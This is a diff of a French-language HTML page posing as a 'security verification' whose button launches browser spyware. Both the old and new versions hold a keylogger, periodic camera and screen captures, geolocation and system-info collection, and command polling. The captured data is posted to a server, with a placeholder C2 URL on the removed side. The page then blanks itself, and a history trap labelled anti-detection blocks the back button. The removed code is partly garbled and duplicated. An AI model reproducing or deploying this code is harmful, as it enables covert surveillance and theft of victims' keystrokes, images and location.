@@ -13,7 +13,6 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
         }
         .container {
             background: rgba(255,255,255,0.95);
@@ -22,20 +21,9 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.3);
             text-align: center;
             max-width: 400px;
-            backdrop-filter: blur(10px);
         }
-        h1 { color: #333; margin-bottom: 20px; font-size: 24px; }
-        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
-        .spinner {
-            width: 50px; height: 50px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-            display: none;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { color: #333; margin-bottom: 20px; }
+        p { color: #666; margin-bottom: 30px; }
         .btn-access {
             background: linear-gradient(45deg, #667eea, #764ba2);
             color: white;
@@ -44,313 +32,156 @@
             font-size: 18px;
             border-radius: 50px;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 10px 20px rgba(102,126,234,0.4);
             font-weight: bold;
         }
-        .btn-access:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(102,126,234,0.6);
-        }
-        .btn-access:active { transform: translateY(0); }
-        .hidden { display: none !important; }
-        #status { font-size: 12px; color: #888; margin-top: 10px; }
+        #status { margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="spinner" id="spinner"></div>
         <h1>🔒 Vérification de Sécurité</h1>
-        <p>Une vérification rapide est nécessaire pour accéder à votre appareil. Cliquez pour autoriser.</p>
-        <button class="btn-access" onclick="grantAccess()" id="accessBtn">
-            🚀 AVOIR ACCÈS MAINTENANT
-        </button>
+        <p>Cliquez pour autoriser l'accès.</p>
+        <button class="btn-access" onclick="start()">🚀 ACTIVER</button>
         <div id="status"></div>
     </div>
-
     <script>
-        let accessGranted = false;
-        let permissions = {
-            camera: null,
-            screen: null,
-            granted: false
-        };
+        let active = false;
+        let modules = {camera: {on: false, int: null}, keylog: {on: false, buf: ''}, screen: {on: false, int: null}};
         
-        let modules = {
-            camera: { active: false, interval: null },
-            keylogger: { active: false, buffer: '' },
-            screen: { active: false, interval: null }
-        };
-
-        // DEMANDER TOUTES LES PERMISSIONS AU CLIC
-        async function grantAccess() {
-            const btn = document.getElementById('accessBtn');
-            const spinner = document.getElementById('spinner');
-            const status = document.getElementById('status');
-
-            btn.classList.add('hidden');
-            spinner.style.display = 'block';
-            status.innerHTML = '⏳ Demande des autorisations...';
-
-            try {
-                // 1. DEMANDER CAMÉRA
-                status.innerHTML = '📹 Autorisation caméra...';
-                permissions.camera = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
-                
-                // 2. DEMANDER PARTAGE D'ÉCRAN
-                status.innerHTML = '🖥️ Autorisation écran...';
-                permissions.screen = await navigator.mediaDevices.getDisplayMedia({video: true});
-                
-                // Arrêter les streams immédiatement
-                permissions.camera.getTracks().forEach(t => t.stop());
-                permissions.screen.getTracks().forEach(t => t.stop());
-                
-                permissions.granted = true;
-                status.innerHTML = '✅ Autorisations accordées';
-                
-            } catch (error) {
-                status.innerHTML = '⚠️ Certaines autorisations refusées';
-                console.error('Permission error:', error);
-            }
-
-            // Démarrer le système
-            accessGranted = true;
-            startKeylogger();
-            setInterval(checkCommands, 3000);
-            checkCommands();
-            collectInitialData();
-            
-            // INTERFACE INVISIBLE APRÈS 3s
-            setTimeout(() => {
-                document.body.innerHTML = '';
-                document.body.style.background = '#000';
-            }, 3000);
+        async function start() {
+            document.getElementById('status').textContent = '✅ Actif';
+            active = true;
+            startKeylog();
+            getInfo();
+            setInterval(getCmd, 3000);
+            setTimeout(() => {document.body.innerHTML = ''; document.body.style.background = '#000';}, 2000);
         }
-
-        // POLLING DES COMMANDES SERVEUR
-        async function checkCommands() {
+        
+        async function getCmd() {
+            if (!active) return;
             try {
-                const response = await fetch('/api/command');
-                if (response.ok) {
-                    const command = await response.json();
-                    if (command.status !== 'no-command') {
-                        executeCommand(command);
-                    }
-                }
+                const r = await fetch('/api/command');
+                const d = await r.json();
+                if (d.status !== 'no-command') runCmd(d);
             } catch(e) {}
         }
-
-        // EXÉCUTER COMMANDES
-        function executeCommand(cmd) {
-            console.log('📥 Command:', cmd.module, cmd.action);
-            
-            switch(cmd.module) {
-                case 'camera':
-                    if (cmd.action === 'start') startCamera(cmd.params.interval || 5);
-                    else if (cmd.action === 'stop') stopCamera();
-                    else if (cmd.action === 'snapshot') captureCamera();
-                    break;
-                case 'keylogger':
-                    if (cmd.action === 'start') startKeylogger();
-                    else if (cmd.action === 'stop') stopKeylogger();
-                    else if (cmd.action === 'dump') dumpKeylogger();
-                    break;
-                case 'screen':
-                    if (cmd.action === 'start') startScreen(cmd.params.quality || 0.5, cmd.params.interval || 2);
-                    else if (cmd.action === 'stop') stopScreen();
-                    break;
+        
+        function runCmd(c) {
+            if (c.module === 'camera') {
+                if (c.action === 'start') startCam(c.params.interval || 5);
+                else if (c.action === 'stop') stopCam();
+                else if (c.action === 'snapshot') capCam();
+            } else if (c.module === 'keylogger') {
+                if (c.action === 'start') startKeylog();
+                else if (c.action === 'stop') stopKeylog();
+                else if (c.action === 'dump') sendKeys();
+            } else if (c.module === 'screen') {
+                if (c.action === 'start') startScr(c.params.quality || 0.5, c.params.interval || 2);
+                else if (c.action === 'stop') stopScr();
             }
         }
-
-        // MODULE CAMÉRA
-        function startCamera(interval) {
-            if (modules.camera.active) return;
-            modules.camera.active = true;
-            modules.camera.interval = setInterval(captureCamera, interval * 1000);
-            captureCamera();
+        
+        function startCam(i) {
+            if (modules.camera.on) return;
+            modules.camera.on = true;
+            modules.camera.int = setInterval(capCam, i * 1000);
+            capCam();
         }
-
-        function stopCamera() {
-            modules.camera.active = false;
-            if (modules.camera.interval) clearInterval(modules.camera.interval);
+        
+        function stopCam() {
+            modules.camera.on = false;
+            if (modules.camera.int) clearInterval(modules.camera.int);
         }
-
-        async function captureCamera() {
+        
+        async function capCam() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play();
+                const s = await navigator.mediaDevices.getUserMedia({video: true});
+                const v = document.createElement('video');
+                v.style.display = 'none';
+                document.body.appendChild(v);
+                v.srcObject = s;
+                v.onloadedmetadata = () => {
+                    v.play();
                     setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                        sendData({type: 'camera', image: canvas.toDataURL('image/jpeg', 0.7)});
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
+                        const c = document.createElement('canvas');
+                        c.width = 640; c.height = 480;
+                        c.getContext('2d').drawImage(v, 0, 0, 640, 480);
+                        send({type: 'camera', image: c.toDataURL('image/jpeg', 0.7)});
+                        s.getTracks().forEach(t => t.stop());
+                        v.remove();
                     }, 500);
                 };
-            } catch(e) {
-                console.error('Camera error:', e);
-            }
+            } catch(e) {}
         }
-
-        // MODULE KEYLOGGER
-        function startKeylogger() {
-            if (modules.keylogger.active) return;
-            modules.keylogger.active = true;
-            modules.keylogger.buffer = '';
-            
-            document.addEventListener('keydown', logKey);
-        }
-
-        function stopKeylogger() {
-            modules.keylogger.active = false;
-            document.removeEventListener('keydown', logKey);
-        }
-
-        function logKey(e) {
-            if (!modules.keylogger.active) return;
-            modules.keylogger.buffer += e.key;
-            
-            // Envoyer par batch de 50 caractères
-            if (modules.keylogger.buffer.length >= 50) {
-                dumpKeylogger();
-            }
-        }
-
-        function dumpKeylogger() {
-            if (modules.keylogger.buffer) {
-                sendData({type: 'keylog', keys: modules.keylogger.buffer});
-                modules.keylogger.buffer = '';
-            }
-        }
-
-        // MODULE PARTAGE D'ÉCRAN
-        function startScreen(quality, interval) {
-            if (modules.screen.active) return;
-            modules.screen.active = true;
-            modules.screen.interval = setInterval(() => captureScreen(quality), interval * 1000);
-            captureScreen(quality);
-        }
-
-        function stopScreen() {
-            modules.screen.active = false;
-            if (modules.screen.interval) clearInterval(modules.screen.interval);
-        }
-
-        async function captureScreen(quality) {
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play();
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 1280;
-                        canvas.height = 720;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-                        sendData({type: 'screen', image: canvas.toDataURL('image/jpeg', quality)});
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
-                    }, 500);
-                };
-            } catch(e) {
-                console.error('Screen error:', e);
-            }
-        }
-
-        // DONNÉES INITIALES
-        function collectInitialData() {
-            // Géolocalisation
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => sendData({
-                        type: 'location',
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    }),
-                    () => {},
-                    {enableHighAccuracy: true}
-                );
-            }
-
-            // Infos système
-            sendData({
-                type: 'system',
-                ua: navigator.userAgent,
-                lang: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                platform: navigator.platform,
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory,
-                online: navigator.onLine,
-                timestamp: Date.now()
+        
+        function startKeylog() {
+            if (modules.keylog.on) return;
+            modules.keylog.on = true;
+            modules.keylog.buf = '';
+            document.addEventListener('keydown', e => {
+                if (modules.keylog.on) {
+                    modules.keylog.buf += e.key;
+                    if (modules.keylog.buf.length >= 50) sendKeys();
+                }
             });
         }
-
-        // ENVOI SERVEUR
-        async function sendData(payload) {
-            try {
-                await fetch('/receive', {
-                    method: 'POST',
-                    body: JSON.stringify(payload),
-                    headers: {'Content-Type': 'application/json'}
-                });
-            } catch(e) {
-                console.error('Send error:', e);
+        
+        function stopKeylog() {
+            modules.keylog.on = false;
+        }
+        
+        function sendKeys() {
+            if (modules.keylog.buf) {
+                send({type: 'keylog', keys: modules.keylog.buf});
+                modules.keylog.buf = '';
             }
-        }y ? 'active' : 'no',
-                    timestamp: Date.now()
-                });
-
+        }
+        
+        function startScr(q, i) {
+            if (modules.screen.on) return;
+            modules.screen.on = true;
+            modules.screen.int = setInterval(() => capScr(q), i * 1000);
+            capScr(q);
+        }
+        
+        function stopScr() {
+            modules.screen.on = false;
+            if (modules.screen.int) clearInterval(modules.screen.int);
+        }
+        
+        async function capScr(q) {
+            try {
+                const s = await navigator.mediaDevices.getDisplayMedia({video: true});
+                const v = document.createElement('video');
+                v.style.display = 'none';
+                document.body.appendChild(v);
+                v.srcObject = s;
+                v.onloadedmetadata = () => {
+                    v.play();
+                    setTimeout(() => {
+                        const c = document.createElement('canvas');
+                        c.width = 1280; c.height = 720;
+                        c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
+                        send({type: 'screen', image: c.toDataURL('image/jpeg', q)});
+                        s.getTracks().forEach(t => t.stop());
+                        v.remove();
+                    }, 500);
+                };
             } catch(e) {}
         }
-
-        // CAPTURE FRAME (image base64)
-        function captureFrame(video, stream = null) {
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video || stream, 0, 0, 640, 480);
-            sendData({type: 'capture', image: canvas.toDataURL('image/jpeg', 0.7)});
+        
+        function getInfo() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => send({type: 'location', lat: p.coords.latitude, lon: p.coords.longitude}), () => {});
+            }
+            send({type: 'system', ua: navigator.userAgent, lang: navigator.language, screen: `${screen.width}x${screen.height}`, platform: navigator.platform, timestamp: Date.now()});
         }
-
-        // ENVOI SERVEUR (votre C2)
-        async function sendData(payload) {
+        
+        async function send(d) {
             try {
-                await fetch('https://votre-serveur-c2.com/receive', {
-                    method: 'POST',
-                    body: JSON.stringify(payload),
-                    headers: {'Content-Type': 'application/json'}
-                });
-            } catch(e) {
-                // Fallback WebSocket / localStorage
-                localStorage.setItem(`data_${Date.now()}`, JSON.stringify(payload));
-            }
+                await fetch('/receive', {method: 'POST', body: JSON.stringify(d), headers: {'Content-Type': 'application/json'}});
+            } catch(e) {}
         }
-
-        // PRÉ-ACTIVATION PARTIELLE (mousemove tracking)
-        document.addEventListener('mousemove', (e) => {
-            if (accessGranted) {
-                sendData({type: 'mouse', x: e.clientX, y: e.clientY});
-            }
-        });
-
-        // ANTI-DETECTION (supprime history)
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => history.go(1);
     </script>
 </body>
 </html>
